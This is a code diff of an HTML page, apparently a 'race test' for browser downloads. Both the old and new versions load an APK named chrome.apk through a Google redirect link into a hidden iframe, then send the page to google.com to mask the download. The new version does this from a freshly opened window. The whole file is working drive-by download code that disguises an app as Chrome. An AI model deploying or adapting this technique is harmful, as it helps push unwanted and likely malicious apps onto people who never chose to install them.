@@ -2,7 +2,8 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Multi-Attempt Iframe Download Race</title>
+<title>Window Open Iframe Race</title>
+
 <style>
 button{
 background:#4CAF50;
@@ -12,63 +13,49 @@ padding:15px 30px;
 font-size:16px;
 cursor:pointer;
 }
-#log{
-font-family:monospace;
-margin-top:20px;
-margin-top:20px;
-}
-iframe{
-width:1px;
-height:1px;
-border:0;
-position:absolute;
-left:-9999px; /* hidden */
-}
 </style>
+
 </head>
 <body>
 
 <center>
-<h2>Multi-Attempt Iframe Race Test</h2>
-<button onclick="start()">Start Test</button>
-<div id="log"></div>
+<h2>Window.open Download Test</h2>
+<button onclick="go()">Start</button>
 </center>
 
-<!-- Single hidden iframe -->
-<iframe id="frame"></iframe>
+<script>
+
+const url="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3";
+
+function go(){
+
+let w = window.open("about:blank","_blank");
+
+w.document.write(`
+<html>
+<body>
+
+<iframe id="frame"
+style="display:none;"></iframe>
 
 <script>
-const url = "https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3";
 
-function start(){
-    log("Starting multi-attempt iframe race test...");
+let frame=document.getElementById("frame");
 
-    // variasi delay untuk redirect
-    const delays = [20, 50, 100, 180, 250, 320, 400];
+frame.src="${url}";
 
-    // beberapa attempt
-    delays.forEach((delay,i) => {
-        setTimeout(() => {
-            log("Attempt #" + (i+1) + " with redirect delay " + delay + "ms");
-            triggerIframe();
-            setTimeout(()=>{
-                window.location.href="https://google.com";
-            }, delay);
-        }, i*1200); // jeda antar attempt
-    });
+setTimeout(function(){
+location.href="https://google.com";
+},200);
+
+<\/script>
+
+</body>
+</html>
+`);
+
 }
 
-function triggerIframe(){
-    const frame = document.getElementById("frame");
-    frame.src="about:blank"; // reset iframe
-    setTimeout(()=>{ frame.src=url; }, 20); // trigger download setelah reset
-}
-
-function log(msg){
-    const d = document.createElement("div");
-    d.textContent = msg;
-    document.getElementById("log").appendChild(d);
-}
 </script>
 
 </body>
